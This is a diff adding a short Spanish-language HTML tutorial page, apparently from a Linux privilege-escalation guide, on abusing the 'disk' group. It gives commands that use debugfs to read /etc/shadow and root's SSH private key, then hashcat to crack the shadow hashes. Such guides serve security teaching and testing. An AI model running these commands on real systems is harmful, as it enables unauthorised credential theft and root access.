@@ -1,0 +1,33 @@
+<h1>Grupo Disk</h1>
+
+<h2><i class="bi bi-check-circle me-2"></i></i>Explicación</h2>
+<p class="mainText">
+    El grupo <b>disk</b> tiene acceso a los dispositivos de almacenamiento del sistema, lo que le permite acceder con privilegios de root a casi 
+    todos los archivos presentes en la máquina.
+</p>
+<p class="mainComment">
+    Es importante notar que no se podrán escribir en archivos que pertenecen a root como /etc/passwd.
+</p>
+
+<h2><i class="bi bi-check-circle me-2"></i></i>Ataque</h2>
+<p class="mainText">
+    Un atacante podría ingresar en debugfs y acceder a archivos sensibles dentro del sistema, como <b>/etc/shadow</b>, para luego intentar realizar un ataque 
+    de cracking.
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">#Para entrar en debugfs en la partición
+debugfs /dev/sda1
+#Podemos ver ficheros interesantes
+debugfs: cat /etc/shadow
+debugfs: cat /root/.ssh/id_rsa
+</code></pre>
+</div>
+<!-- Code-->
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">#Para realizar el cracking del fichero shadow
+hashcat -m 1800 shadow rockyou.txt
+</code></pre>
+</div>
+<!-- Code-->
